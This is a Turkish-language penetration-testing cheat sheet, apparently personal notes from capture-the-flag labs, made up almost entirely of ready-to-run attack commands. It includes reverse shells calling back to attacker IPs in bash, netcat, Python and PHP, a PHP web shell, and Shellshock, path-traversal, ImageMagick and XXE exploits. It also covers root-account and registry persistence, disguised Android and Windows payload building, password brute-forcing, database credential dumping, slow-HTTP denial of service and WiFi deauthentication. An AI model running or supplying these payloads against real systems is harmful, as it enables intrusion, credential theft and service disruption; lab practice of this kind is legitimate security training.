# Pentest El-Kitabı

# SH to Bash #
/bin/bash -i yada python3 -c 'import pty; pty.spawn("/bin/bash")'

# Hashcat Kullanım Örneği #
-m ---> Hash türünü belirtmek için kullanılır.

0 ---> Kütüphanede ki hash'in sayısı

" " ---> İki tırnak arası Hash'in geleceği yer.

/usr/share/wordlists/rockyou.txt ---> Hangi wordlist'i kullanacaksanız onu yazacağınız yer.

--force ---> Uyarıları geçer.

hashcat -m 0 "UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds" /usr/share/wordlists/rockyou.txt --force

# GCC Compile #
-o ---> dosyanın çıktısının ismi.

gcc -o örnek.c/py/rb

# Python ile PC servis etme #
python3 -m http.server

# CTF'ler için basic NMAP komutu #
nmap -sV -sC -A -T4 <ip.adress>

# Dirb Örnek Basic Kullanım #
dirb http://<ip.adress> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# JohnTheRipper Örnek Kullanımlar #
john -format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt /root/Desktop/spider.txt ---> Hash formatını biliyorsanız -format=<buraya yazınız>

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

zip2john backup.zip > backup.hash ---> Zip şifrelerini hashlemek ve ardından kırmak için. ---> Kırmak istediğiniz zip > " hash çıktısının dosya adı "

ssh2john id_rsa > aa.txt ---> id_rsa'leri kırmak için.

# SMB'ye bakmak için #
smbclient -L <ip.adress> ---> Full enum

smbclient //<ip.adress>/<Bakmak istediğiniz dosyanın ismi>

# SCP kullanımı #
scp /root/37292.c <Kullanıcının ismi>@<ip.adress>:/tmp ---> Karşı tarafa ssh ile dosya aktarımı

scp <Kullanıcının ismi>@<ip.adress>:/home/james/Alien_autospy.jpg ---> Karşı taraftan ssh ile dosya çekme

# ECHO kullanımları #
echo -n "<Rot13-HasH>" | tr 'A-Za-z' 'N-ZA-Mn-za-m' ---> ROT13 hash decode

echo -n "Base64-Hash" | base64 -d ---> Base64 Hash decode

echo -n "Base64 Hash'e çevirmek istediğiniz kod. Örnek = (echo -n "bash -i >& /dev/tcp/10.8.50.72/4444 0>&1" | base64) " | base64

echo "<Yazmak istediğiniz şey >" > < İçine yazmak istediğiniz dosya/doküman>

echo 1 > /proc/sys/net/ipv4/ip_forward ---> IP forward
 
echo "cp /bin/bash /tmp && chmod +s /tmp/bash" > /etc/print.sh

echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.69",4486));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'" > cow.sh

echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.69 4485 >/tmp/f" > admin_checks

echo -n "bash -i >& /dev/tcp/10.8.50.72/4444 0>&1" | base64

# WPSCAN Kulanımı #
wpscan --url < URL > -e vp,u ---> '-e' = Enum || vp ---> Vulnerable plugins || u ---> Users

wpscan --url < URL > --username elyana --password /usr/share/wordlists/rockyou.txt ---> Wordpress bruteforce saldırı. Manuel.

wpscan --url jack.thm -e u -P /usr/share/wordlists/rockyou.txt ---> Wordpress bruteforce saldırı. Otomatik.

# GOBUSTER Kullanımı #
gobuster dir -u < URL > -w < Wordlist >
 
gobuster dir -u < URL > -w < Wordlist > -x php,txt,html,bak,old,tar,gz,tgz,zip,7z ---> '-x' uzantılı dosyaları aramak için kullan.
 
gobuster dir -U < User > -P < Şifre > -u < URL > -w < Wordlist > ---> Id ve Şifre verilmesi gereken yer için.
 
# StegHide Kullanımı #
 steghide info < Img ismi > ---> Resimde saklı herhangi bir dosya var mı ?

steghide extract -sf < Img ismi > ---> Resimde saklı dosya varsa çıkart.

# Mac Changer #
ifconfig eth0 down ---> ETH0 bağlantısını keser.

ifconfig eth0 hw ether 00:11:22:33:44:55 ---> İstediğin MAC adresini atar.

ifconfig eth0 up ---> ETH0 bağlantısını kurar.
 
# SQL Map #
sqlmap -r request --dbs --batch ---> Database ve kullanıcıları çıkarır.

sqlmap -r request --dbs --batch -D wordpress --tables ---> Database'de ki tabloları gösterir.

sqlmap -r request --dbs --batch -D wordpress -T wp_users --columns ---> Database'de ki kolonları gösterir.

sqlmap -r request --dbs --batch -D wordpress -T wp_users -C user_email,user_pass --sql-query "Select user_email,user_pass from wp_users" ---> Database'den istediğimiz bilgileri çekmek.

sqlmap -r request --dump -D wordpress -T wp_users ---> Wordpress kullanılmışsa Wordpress kullanıcılarını çekme.
 
# WP Example #
http://10.10.85.123/wordpress/wp-content/themes/twentytwenty/404.php ---> Wordpress dosyalarında 404.php'de değişiklik yaptığında gideceğin yer.
 
# Microsoft Downloader #
Invoke-WebRequest <resource_to_download> -outfile <output_file_name>
 
# GoBuster #
gobuster dir -u 10.10.111.215 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ---> Basit kullanım

gobuster dir -u 10.10.150.189 -w /usr/share/wordlists/dirb/common.txt ---> Basit kullanım

gobuster dir -u 10.10.150.189 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html ---> php,txt,html uzantılıları da arama

gobuster dir -U joker -P hannah -u http://10.10.9.219:8080/ -x bak,old,tar,gz,tgz,zip,7z -w /usr/share/wordlists/dirb/common.txt ---> user ve password girerek bak,old,tar,gz,tgz,zip,7z uzantıları arama.

gobuster vhost -u http://vulnnet.thm -w /usr/share/wordlists/dirb/common.txt
 
# Sudo #
sudo -l ls -la

sudo -u toby /bin/bash

sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 
# Import OS #

import os
os.system("/bin/bash")

# Hydra #
hydra -l joker -P /usr/share/wordlists/rockyou.txt 10.10.9.219 ssh -vV

hydra -l fox -P /usr/share/wordlists/rockyou.txt -f 10.10.32.242 http-get ----> Basic Auto - Get Metod.

hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.225.50 -vV

hydra hogwartz-castle.thm http-form-post "/login/index.php:user=^USER^&password=^PASS^:Incorrect Username or Password" -l Hagrid -P /usr/share/wordlists/rockyou.txt

hydra -l admin -P rockyou.txt 10.10.159.24 http-post-form “/login/index.php:user=^USER^&pass=^PASS^:Username or password invalid” -f

hydra -l boris -P /usr/share/wordlists/rockyou.txt pop3://10.10.117.44:55007 -Vv 

# Basic HashID #
hashid -m $2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG

# Tunnel #
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.229 4485 >/tmp/f

-c 'bash -i >& /dev/tcp/10.9.1.69/4486 0>&1'

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.0.229/4485 0>&1'");

php -r '$sock=fsockopen("10.9.0.229",4485);exec("/bin/sh -i <&3 >&3 2>&3");'

<?php system($_GET['cmd']); ?>

<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.229 4485 >/tmp/f'); ?>

# ARP Scanner #
arp-scan -I eth0 192.168.240.128/24

arp -a

## SSH ##

ssh -i id_rsa jessie@10.10.176.189

# Testing Web App #
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php

http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log

10.10.4.54/shell.php?cmd=nc%2010.9.1.69%204485%20-e%20/bin/bash

http://10.10.216.6:22/nnxhweOV/index.php?cmd=nc%20-e%20/bin/bash%2010.11.9.81%2080%209999

# Find #
find / -name elyana 2>/dev/null - - - - SHELL=/bin/bash script -q /dev/nulls - Meterpreter

find / -user hermonine -type f 2>/dev/null

find / -type f -user root -perm -u=s 2>/dev/null

find / -user root -perm -4000 -executable -type f 2>/dev/null

find / -type f -name "proof.txt" -exec ls -l {} + 2>/dev/null

find / -type f -group lxd -exec ls -l {} + 2>/dev/null

find / -type f \( -name 8V2L -o -name bny0 -o -name c4ZX -o -name D8B3 -o -name FHl1 -o -name oiM0 -o -name PFbD -o -name rmfX -o -name SRSq -o -name uqyw -o -name v2Vb -o -name X1Uy \) -exec ls -la {} \; 2>/dev/null

# LTrace #
ltrace /usr/sbin/checker

# Docker #
docker images

docker run -v /:/mnt --rm -it bash chroot /mnt bash

# Head #
head asd.txt -c 9

# Curl #
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.9.1.69/4485 0>&1' http://10.10.183.66/cgi-bin/test.cgi

curl 'http://10.10.90.19/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.9.0.229/4485 0>&1' -H "Content-Type: text/plain"

curl -s http://www.team.thm/scripts/script.old

curl -s 10.10.83.164 -D header.txt

# GPG - GPGToJohn #
gpg --import priv.key

gpg --decrypt-file CustomerDetails.xlsx.gpg

gpg2john private.asc > pgp.hash

# Cat Writing #

cat > /home/toby/jobs/cow.sh << EOF
#!/bin/bash

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.69",4485));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
EOF

cat > bak.py << EOF
#!/usr/bin/env python
import pty
pty.spawn("/bin/bash")
EOF

cat > image.png << EOF

cat > image.png << EOF
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.50.72/4444 0<&1 2>&1'
pop graphic-context
pop graphic-context
EOF
 
# FUZZ FUF # 
wfuzz -c -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php?page=FUZZ --hw=0

wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" --hw 290

wfuzz -w /usr/share/wordlists/dirb/common.txt --hc=404 "http://10.10.244.142:5000/api/v1/resources/books?FUZZ=/etc/passwd"

ffuf -w wordlist.txt -u https://target .com/FUZZ -mc 200

# GetCap #
getcap -r / 2>/dev/null

# EnumForLinux #
enum4linux -a 10.10.16.141

# XXD #
xxd thm.jpg | head

# Printf - OpenSSL #
printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1

openssl passwd -1 -salt "inferno" "dante"

printf 'inferno:$1$inferno$vA66L6zp5Qks4kxIc3tvn/:0:0:root:/root:/bin/bash\n' | sudo tee -a /etc/passwd

# Rabin #
rabin2 -z need_to_talk

# NetStat #
netstat -putan

# ECHO Writing #
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.229 4485 >/tmp/f" > /home/server-management/Documents/rev.sh

# SOCAT #
./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22

# XLM Test #
"!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"

# CD D:/ #
cd /d d:

# Shell #
ECHO $SHELL
chsh -s /bin/bash root

# Google #
OR ---> veya için kullanılır.

inurl: ---> urlde geçen sonuçlar için.

intitle: ---> Etikette geçen ifadeleri görmek için.Örn: intitle:"webcamxp 5"

intext: ---> Textlerde geçen ifadeler için.

filetype: ---> Verilecek olan ifadenin dosya biçimine göre arama yapar. Örn: filetype:pdf hacking ---> Hacking kelimesini içeren pdf dosyaları.

allintext: ---> Tüm textin içerisinde arama yapmak için. Örn: allintext:"@gmail.com"

# NetDiscover #
netdiscover -r 182.154.164.1/24

# Redirect Port #

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

## NetCat ##

nc -lvnp 10.10.10.10 80

## Windows Embed ##

C:\Users\Windows\AppData\Local\Programs\Python\Python310\python.exe -m install pyinstaller

C:\Users\Windows\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe test.py --onefile

C:\Users\Windows\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe test.py --onefile --add-file "C\Users\Defult\Desktop\kal.pdf;." 

C:\Users\Windows\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe test.py --onefile --add-file "C\Users\Defult\Desktop\kal.pdf;." --noconsole

C:\Users\Windows\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe test.py --onefile --add-file "C\Users\Defult\Desktop\kal.pdf;." --noconsole --icon C\Users\Defult\Desktop\kal.pdf

## Regedit ##

reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v upgrade /t REG_SZ /d "C:\Users\AppData\upgrade.exe"

## Spike ##

generic_send_tcp 10.10.10.10 9999 spike.spk 0 0

cd /usr/share/metasploit-framework/tools/exploit - ./pattern_create.rb -l 3000 - ./pattern_offset.rb -l -q ---> EIP değeri

cd /usr/share/metasploit-framework/tools/exploit ./nasm_shell.rb ---> JMP ESP 

!mona modules - !mona find -s "\xff\xe4" -m < seçilen dll yada çalışan exe > ## ---> FFE4 output nasm shell.rb

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" ---> badcharacter

## Locate ##

locate < dosyanın tam adı >

## Ngrok Msfvenom ##

./ngrok tcp 4444

msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=1234 R > /root/Desktop/exploit.apk -i 20

service postgresql start

msfconsole use exploit/multi/handler set payload - LHOST=0.0.0.0 - LPORT=4444

## APK İmzalama ##

install jdk

keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore ngroktest.apk alias_name

jarsigner -verify -verbose -certs android_shell.apk
 
 ## Türkçe Klavye ##

setxkbmap tr

## App-Debug-APKTOOL ## 

apktool d app-debug-apk

apktool b app-debug -o newapk.apk

## JDX ##

jadx -d appdebug appdebug.apk

jadx -d appdebug appdebug.apk --deobf

## FireBase ##

https://firestore.googleapis.com/v1/projects/YOUR_PROJECT_ID/databases/(default)/documents/cities/LA

https://firestore.googleapis.com/v1/projects/YOUR_PROJECT_ID/databases/(default)/documents/<Koleksiyon Adı>

curl -X GET "https://firestore.googleapis.com/v1/projects/YOUR_PROJECT_ID/databases/(default)/documents/<Koleksiyon Adı>";

curl -X DELETE "https://firestore.googleapis.com/v1/projects/YOUR_PROJECT_ID/databases/(default)/documents/<Koleksiyon Adı>/<ID>";

## DOS Attack ##

slowhttptest -c 1000 -H -r 200 -c 400 -i 10 -t POST -l 3600 -o ~/Desktop/slow-test1 -g -u https://pentesturl.xyz

slowhttptest -c 3000 -X -r 200 -w 4096 -y 8192 -i 10 -t POST -n 3 -z 32 -x 24 -k 2 -p 2 -l 3600 -o ~/Desktop/slow-test2 -g -u https://pentesturl.xyz

slowhttptest -c 1000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 o- ~/Desktop/slow-test3 -g -u https://pentesturl.xyz

slowhttptest -c 1000 -X -r 200 -w 20 -y 40 -n 5 -z 32 -k 3 o- ~/Desktop/slow-test4 -g -u https://pentesturl.xyz

slowhttptest -c 2000 -X -r 200 -w 2048 -y 4096 -n 3 -z 32 -k 2 -p 3 -l 3600 -o ~/Desktop/slow-test5 -g -u https://pentesturl.xyz

slowhttptest -c 3000 -B -r 300 -i 100  -s 8192 -t fakeverb -p 3 -x 20 -o ~/Desktop/slow-test6 -g -u https://pentesturl.xyz

## Airmon-NG ##

airmon-ng start wlan0

airmon-ng check kill

airodump-ng wlan0mon

airodump-ng --channel 8 --bssid 11:22:33:44:55:66 --write airodump wlan0mon 

aireplay-ng --deauth 5 -a 11:22:33:44:55:66 wlan0mon

aireplay-ng --deauth 5 -a 11:22:33:44:55:66 -c 55:44:88:66:11:22 wlan0mon

iwconfig

ifconfig wlan0 down

ifconfig wlan0 mode monitor

ifconfig wlan0 up



 

